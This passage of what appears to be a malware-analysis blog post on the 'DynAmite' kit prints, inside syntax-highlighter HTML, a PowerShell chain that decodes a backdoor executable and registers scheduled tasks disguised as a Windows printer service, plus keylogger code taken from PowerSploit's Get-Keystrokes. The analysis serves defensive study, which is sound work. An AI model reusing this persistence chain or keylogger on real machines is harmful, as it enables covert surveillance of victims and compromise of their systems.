($loot + "</span><span class="crayon-v">cry</span><span class="crayon-sy">.</span><span class="crayon-i">exe</span><span class="crayon-s">"); certutil -decode t1.crt ($env:TEMP + "</span><span class="crayon-sy">\</span><span class="crayon-v">t1</span><span class="crayon-sy">.</span><span class="crayon-i">xml</span><span class="crayon-s">"); certutil -decode t2.crt ($env:TEMP + "</span><span class="crayon-sy">\</span><span class="crayon-v">t2</span><span class="crayon-sy">.</span><span class="crayon-i">xml</span><span class="crayon-s">"); certutil -decode t3.crt ($env:TEMP + "</span><span class="crayon-sy">\</span><span class="crayon-v">t3</span><span class="crayon-sy">.</span><span class="crayon-i">xml</span><span class="crayon-s">"); certutil -decode t4.crt ($env:TEMP + "</span><span class="crayon-sy">\</span><span class="crayon-v">t4</span><span class="crayon-sy">.</span><span class="crayon-i">xml</span><span class="crayon-s">"); certutil -decode t5.crt ($env:TEMP + "</span><span class="crayon-sy">\</span><span class="crayon-v">t5</span><span class="crayon-sy">.</span><span class="crayon-i">xml</span><span class="crayon-s">"); certutil -decode bd.crt C:\ProgramData\bd.exe</span></div><div class="crayon-line" id="crayon-60a9b96a2c993771932205-3"><span class="crayon-s">schtasks.exe /create /TN "</span><span class="crayon-v">Microsoft</span><span class="crayon-sy">\</span><span class="crayon-v">Windows</span><span class="crayon-sy">\</span><span class="crayon-e">Windows </span><span class="crayon-e">Printer </span><span class="crayon-v">Manager</span><span class="crayon-sy">\</span><span class="crayon-cn">1</span><span class="crayon-s">" /XML ($env:TEMP + "</span><span class="crayon-sy">\</span><span class="crayon-v">t1</span><span class="crayon-sy">.</span><span class="crayon-i">xml</span><span class="crayon-s">")</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c993771932205-4"><span class="crayon-s">schtasks.exe /create /TN "</span><span class="crayon-v">Microsoft</span><span class="crayon-sy">\</span><span class="crayon-v">Windows</span><span class="crayon-sy">\</span><span class="crayon-e">Windows </span><span class="crayon-e">Printer </span><span class="crayon-v">Manager</span><span class="crayon-sy">\</span><span class="crayon-cn">2</span><span class="crayon-s">" /XML ($env:TEMP + "</span><span class="crayon-sy">\</span><span class="crayon-v">t2</span><span class="crayon-sy">.</span><span class="crayon-i">xml</span><span class="crayon-s">")</span></div><div class="crayon-line" id="crayon-60a9b96a2c993771932205-5"><span class="crayon-s">schtasks.exe /create /TN "</span><span class="crayon-v">Microsoft</span><span class="crayon-sy">\</span><span class="crayon-v">Windows</span><span class="crayon-sy">\</span><span class="crayon-e">Windows </span><span class="crayon-e">Printer </span><span class="crayon-v">Manager</span><span class="crayon-sy">\</span><span class="crayon-cn">3</span><span class="crayon-s">" /XML ($env:TEMP + "</span><span class="crayon-sy">\</span><span class="crayon-v">t3</span><span class="crayon-sy">.</span><span class="crayon-i">xml</span><span class="crayon-s">")</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c993771932205-6"><span class="crayon-s">schtasks.exe /create /TN "</span><span class="crayon-v">Microsoft</span><span class="crayon-sy">\</span><span class="crayon-v">Windows</span><span class="crayon-sy">\</span><span class="crayon-e">Windows </span><span class="crayon-e">Printer </span><span class="crayon-v">Manager</span><span class="crayon-sy">\</span><span class="crayon-cn">4</span><span class="crayon-s">" /XML ($env:TEMP + "</span><span class="crayon-sy">\</span><span class="crayon-v">t4</span><span class="crayon-sy">.</span><span class="crayon-i">xml</span><span class="crayon-s">")</span></div><div class="crayon-line" id="crayon-60a9b96a2c993771932205-7"><span class="crayon-s">schtasks.exe /create /TN "</span><span class="crayon-v">Microsoft</span><span class="crayon-sy">\</span><span class="crayon-v">Windows</span><span class="crayon-sy">\</span><span class="crayon-e">Windows </span><span class="crayon-e">Printer </span><span class="crayon-v">Manager</span><span class="crayon-sy">\</span><span class="crayon-cn">5</span><span class="crayon-s">" /XML ($env:TEMP + "</span><span class="crayon-sy">\</span><span class="crayon-v">t5</span><span class="crayon-sy">.</span><span class="crayon-i">xml</span><span class="crayon-s">")</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c993771932205-8"><span class="crayon-s">schtasks.exe /run /TN "</span><span class="crayon-v">Microsoft</span><span class="crayon-sy">\</span><span class="crayon-v">Windows</span><span class="crayon-sy">\</span><span class="crayon-e">Windows </span><span class="crayon-e">Printer </span><span class="crayon-v">Manager</span><span class="crayon-sy">\</span><span class="crayon-cn">1</span><span class="crayon-s">"</span></div><div class="crayon-line" id="crayon-60a9b96a2c993771932205-9"><span class="crayon-s">schtasks.exe /run /TN "</span><span class="crayon-v">Microsoft</span><span class="crayon-sy">\</span><span class="crayon-v">Windows</span><span class="crayon-sy">\</span><span class="crayon-e">Windows </span><span class="crayon-e">Printer </span><span class="crayon-v">Manager</span><span class="crayon-sy">\</span><span class="crayon-cn">2</span><span class="crayon-s">"</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c993771932205-10"><span class="crayon-s">schtasks.exe /run /TN "</span><span class="crayon-v">Microsoft</span><span class="crayon-sy">\</span><span class="crayon-v">Windows</span><span class="crayon-sy">\</span><span class="crayon-e">Windows </span><span class="crayon-e">Printer </span><span class="crayon-v">Manager</span><span class="crayon-sy">\</span><span class="crayon-cn">3</span><span class="crayon-s">"</span></div><div class="crayon-line" id="crayon-60a9b96a2c993771932205-11"><span class="crayon-s">schtasks.exe /run /TN "</span><span class="crayon-v">Microsoft</span><span class="crayon-sy">\</span><span class="crayon-v">Windows</span><span class="crayon-sy">\</span><span class="crayon-e">Windows </span><span class="crayon-e">Printer </span><span class="crayon-v">Manager</span><span class="crayon-sy">\</span><span class="crayon-cn">4</span><span class="crayon-s">"</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c993771932205-12"><span class="crayon-s">schtasks.exe /run /TN "</span><span class="crayon-v">Microsoft</span><span class="crayon-sy">\</span><span class="crayon-v">Windows</span><span class="crayon-sy">\</span><span class="crayon-e">Windows </span><span class="crayon-e">Printer </span><span class="crayon-v">Manager</span><span class="crayon-sy">\</span><span class="crayon-cn">5</span><span class="crayon-s">"</span></div><div class="crayon-line" id="crayon-60a9b96a2c993771932205-13"><span class="crayon-s">Remove-Item ($env:TEMP + "</span><span class="crayon-sy">\</span><span class="crayon-o">*</span><span class="crayon-sy">.</span><span class="crayon-i">xml</span>"<span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">Recurse</span><span class="crayon-h"> </span>–<span class="crayon-v">Force</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0013 seconds] -->
<p>For the “DynAmite KL” variant, it’s the keylogger portion of the kit but directly lifts code from an older version of the PowerSploit function <a href="https://github.com/PowerShellMafia/PowerSploit/commit/717950d00c7cc352efe8b05c3db84d0e6250474c#diff-8a834e13c96d5508df5ee11bc92c82dd">Get-Keystrokes</a>. Below are the meat of the script and a comparison of the two pieces, showing how DynAmite changes the location of the variables and types.</p>
<p>Get-Keystrokes –</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9b96a2c995025629918" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
$LeftShift    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LShiftKey) -band 0x8000) -eq 0x8000
$RightShift   = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RShiftKey) -band 0x8000) -eq 0x8000
$LeftCtrl     = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LControlKey) -band 0x8000) -eq 0x8000
$RightCtrl    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RControlKey) -band 0x8000) -eq 0x8000
$LeftAlt      = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LMenu) -band 0x8000) -eq 0x8000
$RightAlt     = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RMenu) -band 0x8000) -eq 0x8000
$TabKey       = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Tab) -band 0x8000) -eq 0x8000
$SpaceBar     = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Space) -band 0x8000) -eq 0x8000
$DeleteKey    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Delete) -band 0x8000) -eq 0x8000
$EnterKey     = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Return) -band 0x8000) -eq 0x8000
$BackSpaceKey = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Back) -band 0x8000) -eq 0x8000
$LeftArrow    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Left) -band 0x8000) -eq 0x8000
$RightArrow   = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Right) -band 0x8000) -eq 0x8000
$UpArrow      = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Up) -band 0x8000) -eq 0x8000
$DownArrow    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Down) -band 0x8000) -eq 0x8000
$LeftMouse    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LButton) -band 0x8000) -eq 0x8000
$RightMouse   = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RButton) -band 0x8000) -eq 0x8000
 
if ($LeftShift -or $RightShift) {$LogOutput += '[Shift]'}
if ($LeftCtrl  -or $RightCtrl)  {$LogOutput += '[Ctrl]'}
if ($LeftAlt   -or $RightAlt)   {$LogOutput += '[Alt]'}
if ($TabKey)       {$LogOutput += '[Tab]'}
if ($SpaceBar)     {$LogOutput += '[SpaceBar]'}
if ($DeleteKey)    {$LogOutput += '[Delete]'}
if ($EnterKey)     {$LogOutput += '[Enter]'}
if ($BackSpaceKey) {$LogOutput += '[Backspace]'}
if ($LeftArrow)    {$LogOutput += '[Left Arrow]'}
if ($RightArrow)   {$LogOutput += '[Right Arrow]'}
if ($UpArrow)      {$LogOutput += '[Up Arrow]'}
if ($DownArrow)    {$LogOutput += '[Down Arrow]'}
if ($LeftMouse)    {$LogOutput += '[Left Mouse]'}
if ($RightMouse)   {$LogOutput += '[Right Mouse]'}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9b96a2c995025629918-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c995025629918-2">2</div><div class="crayon-num" data-line="crayon-60a9b96a2c995025629918-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c995025629918-4">4</div><div class="crayon-num" data-line="crayon-60a9b96a2c995025629918-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c995025629918-6">6</div><div class="crayon-num" data-line="crayon-60a9b96a2c995025629918-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c995025629918-8">8</div><div class="crayon-num" data-line="crayon-60a9b96a2c995025629918-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c995025629918-10">10</div><div class="crayon-num" data-line="crayon-60a9b96a2c995025629918-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c995025629918-12">12</div><div class="crayon-num" data-line="crayon-60a9b96a2c995025629918-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c995025629918-14">14</div><div class="crayon-num" data-line="crayon-60a9b96a2c995025629918-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c995025629918-16">16</div><div class="crayon-num" data-line="crayon-60a9b96a2c995025629918-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c995025629918-18">18</div><div class="crayon-num" data-line="crayon-60a9b96a2c995025629918-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c995025629918-20">20</div><div class="crayon-num" data-line="crayon-60a9b96a2c995025629918-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c995025629918-22">22</div><div class="crayon-num" data-line="crayon-60a9b96a2c995025629918-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c995025629918-24">24</div><div class="crayon-num" data-line="crayon-60a9b96a2c995025629918-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c995025629918-26">26</div><div class="crayon-num" data-line="crayon-60a9b96a2c995025629918-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c995025629918-28">28</div><div class="crayon-num" data-line="crayon-60a9b96a2c995025629918-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c995025629918-30">30</div><div class="crayon-num" data-line="crayon-60a9b96a2c995025629918-31">31</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c995025629918-32">32</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9b96a2c995025629918-1"><span class="crayon-sy">$</span><span class="crayon-v">LeftShift</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">ImportDll</span><span class="crayon-o">::</span><span class="crayon-e">GetAsyncKeyState</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-v">Windows</span><span class="crayon-sy">.</span><span class="crayon-v">Forms</span><span class="crayon-sy">.</span><span class="crayon-v">Keys</span><span class="crayon-sy">]</span><span class="crayon-o">::</span><span class="crayon-v">LShiftKey</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">band</span><span class="crayon-h"> </span><span class="crayon-cn">0x8000</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">eq</span><span class="crayon-h"> </span><span class="crayon-cn">0x8000</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c995025629918-2"><span class="crayon-sy">$</span><span class="crayon-v">RightShift</span><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">ImportDll</span><span class="crayon-o">::</span><span class="crayon-e">GetAsyncKeyState</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-v">Windows</span><span class="crayon-sy">.</span><span class="crayon-v">Forms</span><span class="crayon-sy">.</span><span class="crayon-v">Keys</span><span class="crayon-sy">]</span><span class="crayon-o">::</span><span class="crayon-v">RShiftKey</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">band</span><span class="crayon-h"> </span><span class="crayon-cn">0x8000</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">eq</span><span class="crayon-h"> </span><span class="crayon-cn">0x8000</span></div><div class="crayon-line" id="crayon-60a9b96a2c995025629918-3"><span class="crayon-sy">$</span><span class="crayon-v">LeftCtrl</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">ImportDll</span><span class="crayon-o">::</span><span class="crayon-e">GetAsyncKeyState</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-v">Windows</span><span class="crayon-sy">.</span><span class="crayon-v">Forms</span><span class="crayon-sy">.</span><span class="crayon-v">Keys</span><span class="crayon-sy">]</span><span class="crayon-o">::</span><span class="crayon-v">LControlKey</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">band</span><span class="crayon-h"> </span><span class="crayon-cn">0x8000</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">eq</span><span class="crayon-h"> </span><span class="crayon-cn">0x8000</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c995025629918-4"><span class="crayon-sy">$</span><span class="crayon-v">RightCtrl</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">ImportDll</span><span class="crayon-o">::</span><span class="crayon-e">GetAsyncKeyState</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-v">Windows</span><span class="crayon-sy">.</span><span class="crayon-v">Forms</span><span class="crayon-sy">.</span><span class="crayon-v">Keys</span><span class="crayon-sy">]</span><span class="crayon-o">::</span><span class="crayon-v">RControlKey</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">band</span><span class="crayon-h"> </span><span class="crayon-cn">0x8000</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">eq</span><span class="crayon-h"> </span><span class="crayon-cn">0x8000</span></div><div class="crayon-line" id="crayon-60a9b96a2c995025629918-5"><span class="crayon-sy">$</span><span class="crayon-v">LeftAlt</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">ImportDll</span><span class="crayon-o">::</span><span class="crayon-e">GetAsyncKeyState</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-v">Windows</span><span class="crayon-sy">.</span><span class="crayon-v">Forms</span><span class="crayon-sy">.</span><span class="crayon-v">Keys</span><span class="crayon-sy">]</span><span class="crayon-o">::</span><span class="crayon-v">LMenu</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">band</span><span class="crayon-h"> </span><span class="crayon-cn">0x8000</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">eq</span><span class="crayon-h"> </span><span class="crayon-cn">0x8000</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c995025629918-6"><span class="crayon-sy">$</span><span class="crayon-v">RightAlt</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">ImportDll</span><span class="crayon-o">::</span><span class="crayon-e">GetAsyncKeyState</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-v">Windows</span><span class="crayon-sy">.</span><span class="crayon-v">Forms</span><span class="crayon-sy">.</span><span class="crayon-v">Keys</span><span class="crayon-sy">]</span><span class="crayon-o">::</span><span class="crayon-v">RMenu</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">band</span><span class="crayon-h"> </span><span class="crayon-cn">0x8000</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">eq</span><span class="crayon-h"> </span><span class="crayon-cn">0x8000</span></div><div class="crayon-line" id="crayon-60a9b96a2c995025629918-7"><span class="crayon-sy">$</span><span class="crayon-v">TabKey</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">ImportDll</span><span class="crayon-o">::</span><span class="crayon-e">GetAsyncKeyState</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-v">Windows</span><span class="crayon-sy">.</span><span class="crayon-v">Forms</span><span class="crayon-sy">.</span><span class="crayon-v">Keys</span><span class="crayon-sy">]</span><span class="crayon-o">::</span><span class="crayon-v">Tab</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">band</span><span class="crayon-h"> </span><span class="crayon-cn">0x8000</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">eq</span><span class="crayon-h"> </span><span class="crayon-cn">0x8000</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c995025629918-8"><span class="crayon-sy">$</span><span class="crayon-v">SpaceBar</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">ImportDll</span><span class="crayon-o">::</span><span class="crayon-e">GetAsyncKeyState</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-v">Windows</span><span class="crayon-sy">.</span><span class="crayon-v">Forms</span><span class="crayon-sy">.</span><span class="crayon-v">Keys</span><span class="crayon-sy">]</span><span class="crayon-o">::</span><span class="crayon-v">Space</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">band</span><span class="crayon-h"> </span><span class="crayon-cn">0x8000</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">eq</span><span class="crayon-h"> </span><span class="crayon-cn">0x8000</span></div><div class="crayon-line" id="crayon-60a9b96a2c995025629918-9"><span class="crayon-sy">$</span><span class="crayon-v">DeleteKey</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">ImportDll</span><span class="crayon-o">::</span><span class="crayon-e">GetAsyncKeyState</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-v">Windows</span><span class="crayon-sy">.</span><span class="crayon-v">Forms</span><span class="crayon-sy">.</span><span class="crayon-v">Keys</span><span class="crayon-sy">]</span><span class="crayon-o">::</span><span class="crayon-v">Delete</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">band</span><span class="crayon-h"> </span><span class="crayon-cn">0x8000</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">eq</span><span class="crayon-h"> </span><span class="crayon-cn">0x8000</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c995025629918-10"><span class="crayon-sy">$</span><span class="crayon-v">EnterKey</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">ImportDll</span><span class="crayon-o">::</span><span class="crayon-e">GetAsyncKeyState</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-v">Windows</span><span class="crayon-sy">.</span><span class="crayon-v">Forms</span><span class="crayon-sy">.</span><span class="crayon-v">Keys</span><span class="crayon-sy">]</span><span class="crayon-o">::</span><span class="crayon-st">Return</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">band</span><span class="crayon-h"> </span><span class="crayon-cn">0x8000</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">eq</span><span class="crayon-h"> </span><span class="crayon-cn">0x8000</span></div><div class="crayon-line" id="crayon-60a9b96a2c995025629918-11"><span class="crayon-sy">$</span><span class="crayon-v">BackSpaceKey</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">ImportDll</span><span class="crayon-o">::</span><span class="crayon-e">GetAsyncKeyState</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-v">Windows</span><span class="crayon-sy">.</span><span class="crayon-v">Forms</span><span class="crayon-sy">.</span><span class="crayon-v">Keys</span><span class="crayon-sy">]</span><span class="crayon-o">::</span><span class="crayon-v">Back</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">band</span><span class="crayon-h"> </span><span class="crayon-cn">0x8000</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">eq</span><span class="crayon-h"> </span><span class="crayon-cn">0x8000</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c995025629918-12"><span class="crayon-sy">$</span><span class="crayon-v">LeftArrow</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">ImportDll</span><span class="crayon-o">::</span><span class="crayon-e">GetAsyncKeyState</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-v">Windows</span><span class="crayon-sy">.</span><span class="crayon-v">Forms</span><span class="crayon-sy">.</span><span class="crayon-v">Keys</span><span class="crayon-sy">]</span><span class="crayon-o">::</span><span class="crayon-v">Left</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">band</span><span class="crayon-h"> </span><span class="crayon-cn">0x8000</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">eq</span><span class="crayon-h"> </span><span class="crayon-cn">0x8000</span></div><div class="crayon-line" id="crayon-60a9b96a2c995025629918-13"><span class="crayon-sy">$</span><span class="crayon-v">RightArrow</span><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">ImportDll</span><span class="crayon-o">::</span><span class="crayon-e">GetAsyncKeyState</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-v">Windows</span><span class="crayon-sy">.</span><span class="crayon-v">Forms</span><span class="crayon-sy">.</span><span class="crayon-v">Keys</span><span class="crayon-sy">]</span><span class="crayon-o">::</span><span class="crayon-v">Right</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">band</span><span class="crayon-h"> </span><span class="crayon-cn">0x8000</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">eq</span><span class="crayon-h"> </span><span class="crayon-cn">0x8000</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c995025629918-14"><span class="crayon-sy">$</span><span class="crayon-v">UpArrow</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">ImportDll</span><span class="crayon-o">::</span><span class="crayon-e">GetAsyncKeyState</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-v">Windows</span><span class="crayon-sy">.</span><span class="crayon-v">Forms</span><span class="crayon-sy">.</span><span class="crayon-v">Keys</span><span class="crayon-sy">]</span><span class="crayon-o">::</span><span class="crayon-v">Up</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">band</span><span class="crayon-h"> </span><span class="crayon-cn">0x8000</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">eq</span><span class="crayon-h"> </span><span class="crayon-cn">0x8000</span></div><div class="crayon-line" id="crayon-60a9b96a2c995025629918-15"><span class="crayon-sy">$</span><span class="crayon-v">DownArrow</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">ImportDll</span><span class="crayon-o">::</span><span class="crayon-e">GetAsyncKeyState</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-v">Windows</span><span class="crayon-sy">.</span><span class="crayon-v">Forms</span><span class="crayon-sy">.</span><span class="crayon-v">Keys</span><span class="crayon-sy">]</span><span class="crayon-o">::</span><span class="crayon-v">Down</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">band</span><span class="crayon-h"> </span><span class="crayon-cn">0x8000</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">eq</span><span class="crayon-h"> </span><span class="crayon-cn">0x8000</span></div><div class="crayon-line crayon-striped-line" 